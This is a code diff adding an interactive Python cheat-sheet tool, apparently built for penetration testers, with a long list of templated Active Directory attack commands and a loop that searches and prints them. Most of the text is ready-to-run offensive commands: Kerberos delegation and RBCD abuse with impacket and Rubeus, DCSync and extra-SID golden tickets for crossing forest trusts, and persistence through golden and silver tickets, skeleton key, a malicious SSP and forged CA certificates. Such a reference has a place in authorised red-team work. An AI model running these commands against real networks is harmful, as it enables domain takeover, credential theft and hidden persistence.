+        tool='Rubeus', tags='Windows', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUST_TO_AUTH_FOR_DELEGATION', next_step='lateral move (Kerberos TGS)'),
+    Hint(name='Constrained delegation with protocol transition (any)', command=r'psexec \\\{target} {command}', block='kerberos delegation', service=None, ports=None,
+        tool='psexec', tags='Windows', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUST_TO_AUTH_FOR_DELEGATION, Altservice HOST', next_step='lateral move (Kerberos TGS)'),
+    Hint(name='Constrained delegation with protocol transition (any)', command='Enter-Pssession -computername {target}', block='kerberos delegation', service=None, ports=None,
+        tool='powershell', tags='Windows', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUST_TO_AUTH_FOR_DELEGATION, Altservice HTTP', next_step='lateral move (Kerberos TGS)'),
+    Hint(name='Constrained delegation with protocol transition (any)', command='Invoke-Command {target} -Scriptblock {{command}}', block='kerberos delegation', service=None, ports=None,
+        tool='powershell', tags='Windows', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUST_TO_AUTH_FOR_DELEGATION, Altservice HTTP', next_step='lateral move (Kerberos TGS)'),
+    Hint(name='Constrained delegation with protocol transition (any)', command=r'dir \\target\c$', block='kerberos delegation', service=None, ports=None,
+        tool='shell', tags='Windows', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUST_TO_AUTH_FOR_DELEGATION, Altservice CIFS', next_step='lateral move (Kerberos TGS)'),
+    Hint(name='Constrained delegation with protocol transition (any)', command=None, block='kerberos delegation', service=None, ports=None,
+        tool=None, tags=None, comment='Object: msDS-AllowedToDelegateTo, UAC: TRUST_TO_AUTH_FOR_DELEGATION, Altservice LDAP', next_step='lateral move (Kerberos TGS)'),
+
+    Hint(name='Constrained delegation without protocol transition (kerberos only)', command='impacket-addcomputer -computer-name "{rbcd_computer_name}$" -computer-pass "{rbcd_computer_password}" -dc-ip {ip} "{domain}/{user}:{password}"', block='kerberos delegation', service=None, ports=None,
+        tool='impacket', tags='RBCD', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUSTED_FOR_DELEGATION', next_step='lateral move (Kerberos TGS)'),
+    Hint(name='Constrained delegation without protocol transition (kerberos only)', command='impacket-rbcd -delegate-from "{rbcd_computer_name}$" -delegate-to "{constrained}$" -dc-ip "{ip}" -action "write" -hashes "{hash}" {domain}/{constrained}$', block='kerberos delegation', service=None, ports=None,
+        tool='impacket', tags='RBCD', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUSTED_FOR_DELEGATION', next_step='lateral move (Kerberos TGS)'),
+    Hint(name='Constrained delegation without protocol transition (kerberos only)', command='impacket-getST -self -impersonate "Administrator" -dc-ip {ip} {domain}/{rbcd_computer_name}$:"{rbcd_computer_password}"', block='kerberos delegation', service=None, ports=None,
+        tool='impacket', tags='RBCD', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUSTED_FOR_DELEGATION', next_step='lateral move (Kerberos TGS)'),
+    Hint(name='Constrained delegation without protocol transition (kerberos only)', command='impacket-getST -spn host/{constrained} -hashes "" "{domain}/{computer_account}" -impersonate Administrator -dc-ip {ip} -additional-ticket {previous_ticket}', block='kerberos delegation', service=None, ports=None,
+        tool='impacket', tags='RBCD', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUSTED_FOR_DELEGATION', next_step='lateral move (Kerberos TGS)'),
+    Hint(name='Constrained delegation without protocol transition (kerberos only)', command='impacket-getST -spn {spn} -hashes "{hash}" "{domain}/{user}$" -impersonate Administrator -dc-ip {ip} -additional-ticket {previous_ticket}', block='kerberos delegation', service=None, ports=None,
+        tool='impacket', tags='RBCD', comment='Object: msDS-AllowedToDelegateTo, UAC: TRUSTED_FOR_DELEGATION', next_step='lateral move (Kerberos TGS)'),
+
+    Hint(name='Resource-Based Constrained delegation (RBCD)', command='impacket-getST -spn {spn} -hashes "{hash}" "{domain}/{user}$" -impersonate Administrator -dc-ip {ip}', block='kerberos delegation', service=None, ports=None,
+        tool='impacket', tags='RBCD', comment='SPN from ldap msDS-AllowedToDelegateTo', next_step='lateral move (Kerberos TGS)'),
+    Hint(name='Resource-Based Constrained Delegation (RBCD)', command='rubeus.exe hash /password:{computer_password} /user:{computer} /domain:{domain}', block='kerberos delegation', service=None, ports=None,
+        tool='Rubeus', tags='RBCD Windows', comment='Object: msDS-AllowedToActOnBehalfOfOtherIdentity', next_step='domain admin'),
+    Hint(name='Resource-Based Constrained Delegation (RBCD)', command='rubeus.exe s4u /user:{fake_computer$} /aes256:{aes256_hash} /impersonateuser:administrator /msdsspn:cifs/{victim_domain} /altservice:krbtt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:{domain} /ptt', block='kerberos delegation', service=None, ports=None,
+        tool='Rubeus', tags='RBCD Windows', comment='Object: msDS-AllowedToActOnBehalfOfOtherIdentity', next_step='domain admin'),
+    Hint(name='Resource-Based Constrained Delegation (RBCD)', command='impacket-rbcd -delegate-from "{computer}$" -delegate-to "{target}$" -dc-ip {ip} -action "write" {domain}/{user}:{password}', block='kerberos delegation', service=None, ports=None,
+        tool='impacket', tags='RBCD', comment='Object: msDS-AllowedToActOnBehalfOfOtherIdentity', next_step='lateral move (Kerberos TGT)'),
+    Hint(name='Resource-Based Constrained Delegation (RBCD)', command='impacket-getST -spn {spn} "{domain}/{computer_account}:{computer_password}" -impersonate Administrator -dc-ip {ip}', block='kerberos delegation', service=None, ports=None,
+        tool='impacket', tags='RBCD', comment='SPN from ldap msDS-AllowedToActOnBehalfOfOtherIdentity', next_step='lateral move (Kerberos TGT)'),
+    Hint(name='Resource-Based Constrained Delegation (RBCD) - add computer account', command='impacket-addcomputer -computer-name "{computer_name}" -computer-pass \'{computer_password}\' -dc-host {ip} -domain-netbios {ip} \'{domain}/{user}:{password}\'', block='kerberos delegation', service=None, ports=None,
+        tool='impacket', tags='RBCD', comment='Object: msDS-AllowedToActOnBehalfOfOtherIdentity', next_step=None),
+
+    # Trust relationship / Forest to Forest
+
+    Hint(name='Enumeration', command='nltest.exe /trusted_domains', block='trust', service=None, ports=None,
+        tool='nltest.exe', tags='Windows', comment=None, next_step=None),
+    Hint(name='Enumeration', command='([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()', block='trust', service=None, ports=None,
+        tool=None, tags='Windows', comment=None, next_step=None),
+    Hint(name='Enumeration', command='Get-DomainTrust -Domain {domain}', block='trust', service=None, ports=None,
+        tool='powershell', tags='Windows', comment=None, next_step=None),
+    Hint(name='Enumeration', command='Get-DomainTrustMapping', block='trust', service=None, ports=None,
+        tool='PowerView', tags='Windows', comment=None, next_step=None),
+    Hint(name='Enumeration', command='ldeep ldap -u {user} -p "{password}" -d {domain} -s ldap://{ip} trusts', block='trust', service='LDAP', ports='389 636 3268 3269',
+        tool='ldeep', tags=None, comment=None, next_step=None),
+
+    Hint(name='Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent) - Golden ticket', command='Get-DomainSID -Domain {domain}', block='trust', service=None, ports=None,
+        tool='PowerView', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent) - Golden ticket', command=r'mimikatz lsadump::dcsync /domain:{domain} /user:{domain}\krbtgt', block='trust', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent) - Golden ticket', command='mimikatz kerberos::golden /user:Administrator /krbtgt:{hash_krbtgt} /domain:{domain} /sid:{user_sid} /sids:{root_domain_sid-519} /ptt', block='trust', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent) - Golden ticket', command='impacket-lookupsid -domain-sids {domain}/{user}:"{password}"@{ip} 0', block='trust', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent) - Golden ticket', command='impacket-ticketer -nthash {child_krbtgt_hash} -domain-sid {child_sid} -domain {child_domain} -extra-sid {parent_domain_sid}-519 goldenuser', block='trust', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent) - Golden ticket', command='impacket-raiseChild {domain}/{user}:"{password}"', block='trust', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+
+    Hint(name='Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent) - inter_realm_ticket TRUST', command='mimikatz lsadump::trust /patch', block='trust', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent) - inter_realm_ticket TRUST', command='mimikatz kerberos::golden /user:Administrator /domain:{domain} /sid:{domain_sid} /aes256:{trust_key_aes256} /sids:{target_domain_sid}-519 /service:krbtgt /target:{target_domain} /ptt', block='trust', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent) - inter_realm_ticket TRUST', command='impacket-ticketer -nthash {trust_key} -domain-sid {child_sid} -domain {child_domain} -extra-sid {parent_domain_sid}-519 -spn krbtgt/{parent_domain} goldenuser', block='trust', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Child Domain to Forest Compromise - extra SIDs (parent/child) (child/parent) - inter_realm_ticket TRUST', command='impacket-getST -k -no-pass -spn cifs/{dc_fqdn} {parent_domain}/trustfakeuser@{parent_domain} -debug', block='trust', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+   
+    Hint(name='Breaking forest trust', command=None, block='trust', service=None, ports=None,
+        tool=None, tags=None, comment='printerbug or petitpotam to force external DC to connect on local unconstrained delegation machine, capture TGT, inject into memory and DCSync', next_step='kerberos delegation (unconstrained)'),
+    Hint(name='ForeignGroupMember', command='MATCH p=(n:User)-[:MemberOf]->(m:Group) WHERE n.domain="{domain}" AND m.domain<>n.domain RETURN p', block='trust', service=None, ports=None,
+        tool='Bloodhound', tags=None, comment='users with foreign Domain Group Membership', next_step=None),
+    Hint(name='ForeignGroupMember', command=r'MATCH p=(n:Group {domain:"{domain}"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain AND n.name<>m.name RETURN p', block='trust', service=None, ports=None,
+        tool='Bloodhound', tags=None, comment='groups with foreign Domain Group Membership', next_step=None),
+    Hint(name='ForeignGroupMember', command='Get-DomainForeignGroupMember -Domain {target}', block='trust', service=None, ports=None,
+        tool='PowerView', tags=None, comment=None, next_step=None),
+    Hint(name='ForeignGroupMember', command='convertfrom-sid {sid}', block='trust', service=None, ports=None,
+        tool='PowerView', tags=None, comment=None, next_step=None),
+    Hint(name='ForeignGroupMember', command=None, block='trust', service=None, ports=None,
+        tool=None, tags=None, comment='user on both domains', next_step='permissions (ACL)'),
+    Hint(name='password reuse', command=None, block='trust', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step='lateral move (credentials, Pass the hash, ...)'),
+
+    Hint(name='Forest to Forest - extra SID (SID History / TREAT_AS_EXTERNAL) - Golden ticket', command='Get-DomainSID -Domain {domain}', block='trust', service=None, ports=None,
+        tool='PowerView', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Forest to Forest - extra SID (SID History / TREAT_AS_EXTERNAL) - Golden ticket', command='Get-DomainSID -Domain {target_domain}', block='trust', service=None, ports=None,
+        tool='PowerView', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Forest to Forest - extra SID (SID History / TREAT_AS_EXTERNAL) - Golden ticket', command='Get-DomainGroupMember -Identity "{group}" -Domain {target_domain}', block='trust', service=None, ports=None,
+        tool='PowerView', tags=None, comment='SID filtering, find group with SID > 1000', next_step='lateral move (Pass the ticket)'),
+    Hint(name='Forest to Forest - extra SID (SID History / TREAT_AS_EXTERNAL) - Golden ticket', command=r'mimikatz lsadump::dcsync /domain:{domain} /user:{domain}\krbtgt', block='trust', service=None, ports=None,
+        tool='mimikatz', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Forest to Forest - extra SID (SID History / TREAT_AS_EXTERNAL) - Golden ticket', command='mimikatz kerberos::golden /user:Administrator /krbtgt:{hash_krbtgt} /domain:{domain} /sid:{user_sid} /sids:{root_domain_sid}-{group_sid_sup_1000} /ptt', block='trust', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Forest to Forest - extra SID (SID History / TREAT_AS_EXTERNAL) - Golden ticket', command='impacket-ticketer -nthash {krbtgt_hash} -domain-sid {from_sid} -domain {from_domain} -extra-sid {to_domain}-{group_id} goldenuser', block='trust', service=None, ports=None,
+        tool='impacket', tags=None, comment='group id must be > 1000', next_step='lateral move (Pass the ticket)'),
+    Hint(name='Forest to Forest - extra SID (SID History / TREAT_AS_EXTERNAL) - Trust ticket', command=None, block='trust', service=None, ports=None,
+        tool=None, tags=None, comment='get the trust ticket in the ntds (TARGET_DOMAINS)', next_step='lateral move (Pass the ticket)'),
+    Hint(name='Forest to Forest - extra SID (SID History / TREAT_AS_EXTERNAL) - Trust ticket', command='impacket-ticketer -nthash {trust_key} -domain-sid {from_domain_sid} -domain {from_domain} -extra-sid {to_domain}-{group_id} -spn krbtgt/{to_domain} trustuser', block='trust', service=None, ports=None,
+        tool='impacket', tags=None, comment='group id must be > 1000', next_step='lateral move (Pass the ticket)'),
+    Hint(name='Forest to Forest - extra SID (SID History / TREAT_AS_EXTERNAL) - Trust ticket', command='impacket-getST -k -no-pass -spn cifs/{dc_fqdn} {parent_domain}/trustfakeuser@{parent_domain} -debug', block='trust', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step='lateral move (Pass the ticket)'),
+    Hint(name='Forest to Forest - MSSQL trusted links', command='Get-SQLSerrLinkCrawl -username {user} -password {password} -Verbose -Instance {sql_instance}', block='trust', service=None, ports=None,
+        tool='powershell', tags='Windows', comment=None, next_step='lateral move (MSSQL)'),
+    Hint(name='Forest to Forest - MSSQL trusted links', command='impacket-mssqlclient -windows-auth \'{domain}/{user}:{password}@{ip}\'', block='trust', service=None, ports=None,
+        tool='impacket', tags=None, comment='pr #1397', next_step='trustlink -> sp_linkedservers -> use_link -> lateral move (MSSQL)'),
+
+    # Persistence
+
+    Hint(name='Add user to Domain Admins', command='net group "Domain Admins" {user} /add /domain', block='persistence', service=None, ports=None,
+        tool='net', tags='Windows', comment=None, next_step=None),
+    Hint(name='Golden ticket', command='impacket-ticketer -aesKey {aes} -domain-sid {domain_sid} -domain {domain} {any_user}', block='persistence', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step=None),
+    Hint(name='Golden ticket', command='mimikatz "kerberos::golden /user:{admin_user} /domain:{domain} /sid:{domain_sid} /aes256:{krbtgt_aes256} /ptt"', block='persistence', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment=None, next_step=None),
+    Hint(name='Silver ticket', command='mimikatz "kerberos::golden /sid:{current_user_sid} /domain:{domain_sid} /target:{target_server} /service:{target_service} /aes256:{computer_aes256_key} /user:{any_user} /ptt"', block='persistence', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment=None, next_step=None),
+    Hint(name='Silver ticket', command='impacket-ticketer -nthash {machine_nt_hash} -domain-sid {domain_sid} -domain {domain} {any_user}', block='persistence', service=None, ports=None,
+        tool='impacket', tags=None, comment=None, next_step=None),
+    Hint(name='Diamond ticket', command=None, block='persistence', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step=None),
+    Hint(name='Sapphire ticket', command=None, block='persistence', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step=None),    
+    Hint(name='Directory Service Restore Mode (DSRM)', command=r'New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD', block='persistence', service=None, ports=None,
+        tool='powershell', tags='Windows', comment=None, next_step=None),
+    Hint(name='Skeleton Key', command='mimikatz "privilege::debug" "misc::skeleton" "exit"', block='persistence', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment='password is mimikatz', next_step=None),
+    Hint(name='Custom SSP', command='mimikatz "privilege::debug" "misc::memssp" "exit"', block='persistence', service=None, ports=None,
+        tool='mimikatz', tags='Windows', comment='C:\\Windows\\System32\\kiwissp.log', next_step=None),
+    Hint(name='Golden certificate', command='certipy ca -backup -ca "{ca_name}" -username {user}@{domain} -hashes {hash}', block='persistence', service=None, ports=None,
+        tool='certipy', tags=None, comment=None, next_step=None),
+    Hint(name='Golden certificate', command='certipy forge -ca-pfx {ca_private_key} -upn {user}@{domain} -subject "CN={user},CN=Users,DC={corp},DC={local}"', block='persistence', service=None, ports=None,
+        tool='certipy', tags=None, comment=None, next_step=None),
+    Hint(name='DC shadow', command=None, block='persistence', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step=None),
+    Hint(name='ACL manipulation', command=None, block='persistence', service=None, ports=None,
+        tool=None, tags=None, comment=None, next_step=None),
+]
+
+intel = {'users_dict': 'users.txt', 'hashes_list': 'hashes.txt', 'passwords_dict': 'passwords.txt'}
+for k in ('ip', 'domain', 'if', 'lhost'):
+    try:
+        intel[k] = os.environ.get(k)
+    except:
+        continue
+
+formatting = {}
+
+while True:
+    strict_match = None
+
+    print('\033[35m', end='')
+    try:
+        cmd = input('?) ').strip()
+    except EOFError:  # Ctrl+D -> quit
+        sys.exit(1)
+    print('\033[0m', end='')
+    if len(cmd) == 0:
+        continue
+    # quit?
+    if cmd in ['q', 'quit', 'exit']:
+        sys.exit(0)
+    # help
+    elif cmd in ['help']:
+        # TODO help
+        print('')
+
+    # strict match for block (TODO more?)
+    elif cmd.startswith('block '):
+        strict_match = 'block'
+        cmd = cmd[6:]
+
+    # list of X # TODO counts?
+    if cmd in ['blocks', 'tags', 'tools', 'services', 'ports']:
+        uniq = []
+        if cmd in ['blocks', 'tools', 'services']:
+            cmd = cmd[:-1]
+        for h in hints:
+            a = getattr(h, cmd)
+            if isinstance(a, list):
+                for x in a:
+                    uniq.append(x)
+            else:
+                uniq.append(a)
+        uniq = list(dict.fromkeys(uniq))
+        if cmd != 'block':
+            #print(uniq)
+            uniq = sorted(filter(None, uniq), key=lambda x: int(x) if x.isdigit() else x.lower())
+        for x in uniq:
+            print(x)
+
+        
+    # do command
+    else:
+        formatting = {}
+        # assign intel?
+        k, eq, v = cmd.partition(' = ')
+        if eq == ' = ': 
+            if v:
+                intel[k.strip()] = v.strip()
+                continue
+            else:
+                try:
+                    del intel[k.strip()]
+                except:
+                    pass
+                continue
+
+        # print intel?
+        if cmd.strip() == 'intel':
+            pprint(intel)
+
+        # set mode?
+        m, _, w = cmd.partition(' ') 
+        w = w.strip()
+        if m == 'mode' and w:
+            if w in Hint.known_modes:
+                Hint.mode = w
+            else:
+                print('Invalid mode.', file=sys.stderr)
+        
+        # find what needed
+        for hint in hints:
+            if hint.matches(cmd.split(), strict_match):
+                print(hint)
+
+
+
+
+
+
+
